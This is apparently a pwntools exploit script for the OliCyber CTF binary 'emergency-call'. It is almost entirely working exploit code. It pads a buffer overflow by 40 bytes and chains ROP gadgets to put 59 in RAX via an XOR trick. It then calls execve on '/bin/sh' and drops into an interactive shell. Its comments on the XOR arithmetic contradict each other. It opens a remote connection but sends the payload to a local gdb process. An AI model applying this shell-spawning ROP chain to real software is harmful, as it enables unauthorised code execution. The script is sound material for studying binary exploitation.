from pwn import *

HOST = "emergency.challs.olicyber.it"
PORT = 10306

s = remote(HOST, PORT)

context.update(arch='amd64', os='linux')

p = gdb.debug("olicyber/rev/bin/emergency-call", gdbscript='''
b *0x40101d
continue
''')


data = p.recvuntil(b">")
print(data)
p.sendline(b"/bin/sh\x00")

# ROPgadget --binary ./emergency-call | grep "pop"

# Gadget ROP
offset = 40
pop_rdi = 0x401032
pop_rsi = 0x401034
pop_rdx = 0x401036
xor_rax_rdi = 0x401038
syscall = 0x40101a
bss_addr = 0x404000 # 
sub_40101D = 0x40101d  # Read/Write function
ret = 0x401033


payload = b"A" * offset


payload += p64(pop_rdi)
payload += p64(67)          # 67 in RDI (128 ^ 59 = 131)
payload += p64(xor_rax_rdi) # RAX = 120 ^ 67 = 59 (execve)

# After that the program will run the ret function, so we need to prepare the stack for the next syscall
# Preparing execve
payload += p64(pop_rdi)
payload += p64(bss_addr) # first argument (RDI) = bss_addr
payload += p64(pop_rsi)
payload += p64(0) # second argument (RSI) = 0
payload += p64(pop_rdx)
payload += p64(0) # third argument (RDX) = 0

# payload += p64(ret)
payload += p64(syscall)

check_rax = len(payload) + 1
check_rdi = check_rax ^ 59
print(f"Check RAX: {check_rax}")
print(f"Check RDI: {check_rdi}")

data = p.recvuntil(b">")
print(data)
p.sendline(payload)

p.interactive()